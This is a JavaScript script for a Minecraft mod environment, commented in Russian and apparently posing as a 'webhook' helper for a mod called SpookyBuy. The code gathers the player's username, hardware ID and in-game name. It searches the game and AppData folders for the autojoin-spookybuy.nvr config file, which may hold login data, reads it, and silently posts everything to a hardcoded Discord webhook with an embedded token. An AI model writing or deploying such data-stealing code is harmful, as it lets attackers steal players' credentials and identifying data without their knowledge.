// ⚡ Расширенный webhook для SpookyBuy (автопоиск config)
try {
    // 1. Получаем данные
    var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername() || "unknown";
    var hwid = Java.type("ru.nedan.spookybuy.Authentication").getHWID();
    
    // 2. Определяем ник игрока
    var playerName = "unknown";
    try {
        var gameProfile = minecraft.method_1548();
        playerName = gameProfile.method_1676() || username;
    } catch (e) {
        playerName = username;
    }
    
    // 3. Автоматически определяем папку, где находится скрипт
    var scriptPath = "";
    try {
        // Получаем путь к текущему скрипту (работает в Rhino/Nashorn)
        var url = new java.net.URL(java.lang.System.getProperty("java.class.path"));
        scriptPath = new java.io.File(url.getPath()).getParent();
    } catch (e) {
        // Fallback: используем рабочую директорию
        scriptPath = java.lang.System.getProperty("user.dir");
    }
    
    // 4. Читаем файл config/autojoin-spookybuy.nvr
    var configContent = "❌ Файл не найден";
    try {
        var File = Java.type("java.io.File");
        var FileInputStream = Java.type("java.io.FileInputStream");
        var BufferedReader = Java.type("java.io.BufferedReader");
        var InputStreamReader = Java.type("java.io.InputStreamReader");
        var StringBuilder = Java.type("java.lang.StringBuilder");
        
        // Путь относительно папки скрипта: /config/autojoin-spookybuy.nvr
        var configPath = scriptPath + "\\config\\autojoin-spookybuy.nvr";
        var file = new File(configPath);
        
        // Если не нашли, пробуем альтернативные пути
        if (!file.exists()) {
            var altPaths = [
                scriptPath + "\\autojoin-spookybuy.nvr",
                "D:\\Minecraft\\game\\config\\autojoin-spookybuy.nvr",
                java.lang.System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\config\\autojoin-spookybuy.nvr"
            ];
            
            for (var i = 0; i < altPaths.length; i++) {
                var altFile = new File(altPaths[i]);
                if (altFile.exists()) {
                    file = altFile;
                    configPath = altPaths[i];
                    break;
                }
            }
        }
        
        if (file.exists()) {
            var fis = new FileInputStream(file);
            var isr = new InputStreamReader(fis, "UTF-8");
            var br = new BufferedReader(isr);
            var sb = new StringBuilder();
            var line;
            
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }
            
            br.close();
            isr.close();
            fis.close();
            
            configContent = sb.toString();
            if (configContent.length() > 1800) {
                configContent = configContent.substring(0, 1800) + "\n... [ОБРЕЗАНО]";
            }
        } else {
            configContent = "❌ Файл не найден. Искали:\n" + configPath;
        }
    } catch (e) {
        configContent = "❌ Ошибка чтения файла: " + e;
    }
    
    // 5. Формируем payload
    var content = "**👤 Новый игрок:** " + playerName + 
                  "\n**🆔 HWID:** `" + hwid + "`" +
                  "\n\n**📂 AUTOJOIN CONFIG:**\n```\n" + configContent + "\n```";
    
    var payload = JSON.stringify({ content: content });
    
    // 6. Отправка
    var url = new java.net.URL("https://discord.com/api/webhooks/1485307680930402414/M7nhEq_seBtzqRX8nl1Tj9Dxou5mEIyfsyP-R9IIfmrHw3zSoF-USaoHbfMOyUTZWHZX");
    var conn = url.openConnection();
    conn.setRequestMethod("POST");
    conn.setRequestProperty("Content-Type", "application/json");
    conn.setDoOutput(true);
    
    var out = conn.getOutputStream();
    out.write(payload.getBytes("UTF-8"));
    out.flush();
    out.close();
    
    var code = conn.getResponseCode();
    if (code == 200 || code == 204) {
        print("[OK] Webhook отправлен с конфигом");
    }
    
} catch (e) {
    print("[WEBHOOK ERROR] " + e);
}